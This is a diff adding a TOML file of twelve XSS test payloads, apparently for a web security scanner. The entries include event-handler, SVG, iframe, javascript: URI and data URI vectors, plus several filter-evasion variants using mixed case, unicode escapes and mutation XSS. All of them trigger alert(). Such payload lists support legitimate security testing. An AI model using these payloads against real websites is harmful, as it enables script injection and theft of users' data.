@@ -1,0 +1,98 @@
+# Custom XSS Payloads
+# Add your organization-specific XSS payloads here
+
+[[payloads]]
+name = "dom_xss_innerhtml"
+payload_type = "xss"
+payload = "<img src=x onerror=alert('XSS')>"
+description = "Basic XSS via img onerror"
+severity = "high"
+tags = ["xss", "reflected", "basic"]
+
+[[payloads]]
+name = "svg_onload"
+payload_type = "xss"
+payload = "<svg onload=alert('XSS')>"
+description = "XSS via SVG onload event"
+severity = "high"
+tags = ["xss", "svg", "event-handler"]
+
+[[payloads]]
+name = "script_tag_basic"
+payload_type = "xss"
+payload = "<script>alert(document.domain)</script>"
+description = "Basic script tag XSS"
+severity = "high"
+tags = ["xss", "script", "basic"]
+
+[[payloads]]
+name = "svg_animate"
+payload_type = "xss"
+payload = "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"
+description = "XSS via SVG animate element"
+severity = "medium"
+tags = ["xss", "svg", "animate"]
+
+[[payloads]]
+name = "body_onload"
+payload_type = "xss"
+payload = "<body onload=alert('XSS')>"
+description = "XSS via body onload"
+severity = "medium"
+tags = ["xss", "body", "event-handler"]
+
+[[payloads]]
+name = "iframe_srcdoc"
+payload_type = "xss"
+payload = "<iframe srcdoc=\"<script>alert('XSS')</script>\">"
+description = "XSS via iframe srcdoc"
+severity = "high"
+tags = ["xss", "iframe", "srcdoc"]
+
+[[payloads]]
+name = "javascript_protocol"
+payload_type = "xss"
+payload = "javascript:alert(document.cookie)"
+description = "XSS via javascript: protocol"
+severity = "high"
+tags = ["xss", "javascript-protocol", "href"]
+
+[[payloads]]
+name = "data_uri_xss"
+payload_type = "xss"
+payload = "<a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>"
+description = "XSS via data URI"
+severity = "medium"
+tags = ["xss", "data-uri", "link"]
+
+[[payloads]]
+name = "event_handler_case"
+payload_type = "xss"
+payload = "<img src=x OnErRoR=alert('XSS')>"
+description = "XSS with mixed case to bypass filters"
+severity = "high"
+tags = ["xss", "case-bypass", "filter-evasion"]
+
+[[payloads]]
+name = "unicode_escape"
+payload_type = "xss"
+payload = "<script>\\u0061lert('XSS')</script>"
+description = "XSS via Unicode escape sequences"
+severity = "high"
+tags = ["xss", "unicode", "encoding"]
+
+[[payloads]]
+name = "template_literal"
+payload_type = "xss"
+payload = "<script>alert`XSS`</script>"
+description = "XSS via template literals"
+severity = "medium"
+tags = ["xss", "template-literal", "es6"]
+
+[[payloads]]
+name = "mutation_xss"
+payload_type = "xss"
+payload = "<noscript><img src=x onerror=alert('XSS')></noscript>"
+description = "Mutation XSS via noscript"
+severity = "high"
+tags = ["xss", "mutation", "dom-clobbering"]
